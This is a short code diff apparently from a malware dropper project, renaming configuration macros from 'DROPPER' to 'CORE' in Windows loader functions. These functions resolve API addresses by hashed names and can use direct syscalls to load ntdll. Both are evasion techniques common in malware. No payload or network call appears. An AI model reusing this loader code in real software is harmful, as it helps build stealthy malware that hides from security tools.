@@ -1,7 +1,6 @@
-#include <core\ldr.h>
-#include <core\config.h>
+#include <ldr.h>
+#include <config.h>
 #include <crypto\fnv1a.h>
-
 #include "ntapi\ntapi.h"
 #include "wsapi\wsapi.h"
 
@@ -59,8 +58,8 @@ LdrGetProcAddressEx(
 
         for (ULONG y = 0; y != dwProcCount; y++) {
             if (dwFunctionSum == dwNameSumsList[y]) {
-                #if SCFG_DROPPER_LDR_PRINT_FOUND_PROC == ON
-                    $DLOG1(DLG_FLT_SUCCESS, "%p %08lX %s", dwFunctionAddress, dwFunctionSum, (PSTR)((ULONG_PTR)hModule + dwNames[i]));
+                #if SCFG_CORE_LDR_PRINT_FOUND_PROC == ON
+                    $DLOG1(DLG_FLT_DEFAULT, "%p %08lX %s", dwFunctionAddress, dwFunctionSum, (PSTR)((ULONG_PTR)hModule + dwNames[i]));
                 #endif
 
                 ((PULONG_PTR)ProcessList)[y] = dwFunctionAddress;
@@ -100,9 +99,9 @@ LdrLoadNtapi(VOID)
 
     $DLOG3(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);
 
-#if SCFG_DROPPER_NTAPI_INIT_USE_SYSCALLS == ON
+#if SCFG_CORE_NTAPI_INIT_USE_SYSCALLS == ON
     if (FALSE) {
-#elif SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
+#elif SCFG_CORE_NTAPI_INIT_USE_PROCLOAD == ON
     if (TRUE) {
 #else
     if (Config.NtVersion.bIsDeprecated) {
